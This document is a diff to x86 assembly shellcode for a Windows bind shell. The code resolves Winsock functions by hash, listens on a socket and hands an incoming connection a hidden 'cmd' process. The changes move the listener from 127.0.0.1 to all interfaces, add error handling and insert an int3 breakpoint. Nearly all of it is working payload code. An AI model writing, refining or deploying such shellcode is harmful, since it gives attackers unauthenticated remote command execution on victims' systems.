@@ -29,8 +29,7 @@
 ;    
 
     bits   32
-        
-start:
+
     push   ebx
     push   ebp
     push   edi
@@ -61,7 +60,7 @@ cfg_data:
     dd     0xA452DBF7   ; LoadLibraryA
     db     2 ; ok
     dd     0xC9854299   ; WSAStartup
-    db     6 ; 2 x 8 + 32 = 40, ok
+    db     6 ; ok
     dd     0x93192D14   ; WSASocketA
     db     3 ; ok 
     dd     0x17D94F96   ; bind
@@ -290,15 +289,20 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -256
+    add    esp, -512
     mov    edi, esp
 
     ; LoadLibraryA ("ws2_32");
+    xor    eax, eax
+    cdq
+    push   eax
+    push   eax
+    mov    edx, esp
     mov    eax, ~'32'
     not    eax
-    push   eax
-    push   'ws2_'
-    push   esp
+    mov    dword[edx+4], eax
+    mov    dword[edx], 'ws2_'
+    push   edx    
     call   ebp
     pop    eax
     pop    eax
@@ -307,7 +311,9 @@ rc_l2:
     push   edi         ; &wsa
     push   2           ; MAKEWORD(2, 0)
     call   ebp
-
+    test   eax, eax
+    jnz    xit
+    
     ; WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
     push   eax         ; 0
     push   eax         ; 0
@@ -316,6 +322,8 @@ rc_l2:
     push   1           ; SOCK_STREAM
     push   2           ; AF_INET 
     call   ebp
+    test   eax, eax
+    js     xit
     
     xchg   eax, ebx    ; ebx = s
 
@@ -327,7 +335,7 @@ rc_l2:
     not    eax
     stosd
     
-    mov    eax, ~0x0100007F & 0xFFFFFFFF  ; 127.0.0.1
+    mov    eax, ~0x00000000 & 0xFFFFFFFF  ; 
     not    eax
     stosd
     
@@ -337,18 +345,24 @@ rc_l2:
     
     push   ebx         ; s
     call   ebp
+    test   eax, eax
+    jnz    cls_sck
     
     ; listen (s, 0);
     push   eax
     push   ebx
     call   ebp
-    
+    test   eax, eax
+    jnz    cls_sck
+        
     ; accept (s, 0, 0);
     push   eax
     push   eax
     push   ebx
     call   ebp
-    
+    test   eax, eax
+    js     cls_sck
+        
     push   ebx
     xchg   eax, ebx
     
@@ -357,9 +371,9 @@ rc_l2:
     pop    edi
     
     push   edi    
-    mov    al, 104     ; si.cb = sizeof(si); 
+    mov    al, 68     ; si.cb = sizeof(si); 
     stosd
-    mov    al, 100
+    mov    al, 64
     xchg   eax, ecx
     xor    eax, eax
     rep    stosb
@@ -407,22 +421,25 @@ rc_l10x:
     push   ecx         ; NULL
     push   ecx         ; NULL
     push   edx         ; CREATE_NO_WINDOW
-    push   edx         ; TRUE
+    push   1         ; TRUE
     push   ecx         ; NULL
     push   ecx         ; NULL    
     push   eax         ; "cmd", 0
     push   ecx         ; NULL
     call   ebp
+    neg    eax
+    jns    cls_sck
     
     ; WaitForSingleObject (pi.hProcess, INFINITE);
-    push   -1          ; INFINITE
+    push   eax         ; INFINITE
     mov    eax, [edi]
     push   eax         ; pi.hProcess
     call   ebp
-
+cls_sck:
+int3
     ; closesocket (r);
     push   ebx         ; r
     call   ebp
-    
-    sub    esp, -256
+xit:    
+    sub    esp, -512
     ret    
